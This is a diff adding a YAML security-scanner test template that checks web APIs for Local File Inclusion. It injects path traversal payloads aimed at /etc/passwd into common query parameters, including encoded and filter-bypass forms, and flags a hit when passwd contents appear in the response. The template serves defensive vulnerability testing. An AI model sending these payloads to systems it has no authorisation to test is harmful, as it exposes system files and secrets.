@@ -1,0 +1,113 @@
+id: LFI_BY_PATH_TRAVERSAL_QUERY_PARAM
+info:
+  name: "Local File Inclusion via Path Traversal in Query Parameters"
+  description: "Tests for Local File Inclusion vulnerabilities by injecting path traversal sequences (../../../etc/passwd) into query parameters."
+  details: >
+    "Local File Inclusion (LFI) occurs when an application includes files based on
+    user-supplied input without proper sanitization. An attacker can use directory
+    traversal sequences (../) to escape the web root and include sensitive system files
+    such as /etc/passwd, /etc/shadow, or application configuration files. Query
+    parameters like file=, path=, page=, template=, and include= are common attack vectors."
+  impact: "Successful LFI allows reading of sensitive files including /etc/passwd,
+    private keys, database configurations, source code, and application secrets.
+    In some configurations combined with log poisoning, LFI can lead to Remote Code Execution."
+  category:
+    name: LFI
+    shortName: LFI
+    displayName: Local File Inclusion
+  subCategory: LFI_BY_PATH_TRAVERSAL_QUERY_PARAM
+  severity: HIGH
+  tags:
+    - OWASP top 10
+    - Business logic
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    - "https://cwe.mitre.org/data/definitions/22.html"
+  cwe:
+    - CWE-22
+    - CWE-73
+  cve:
+    - CVE-2021-41773
+    - CVE-2023-28432
+
+attributes:
+  nature: INTRUSIVE
+  plan: FREE
+  duration: FAST
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    neq: "OPTIONS"
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - "root:x:"
+
+execute:
+  type: single
+  requests:
+    - req:
+        - add_query_param:
+            file: "../../../etc/passwd"
+        - add_query_param:
+            file: "../../../../etc/passwd"
+        - add_query_param:
+            path: "../../../etc/passwd"
+        - add_query_param:
+            page: "../../../etc/passwd"
+        - add_query_param:
+            include: "../../../etc/passwd"
+        - add_query_param:
+            template: "../../../etc/passwd"
+        - add_query_param:
+            doc: "../../../etc/passwd"
+        - add_query_param:
+            file: "..%2F..%2F..%2Fetc%2Fpasswd"
+        - add_query_param:
+            file: "....//....//....//etc//passwd"
+        - add_query_param:
+            file: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    contains_either:
+      - "root:x:"
+      - "root:0:0"
+      - "/bin/bash"
+      - "/bin/sh"
+      - "daemon:x:"
+      - "nobody:x:"
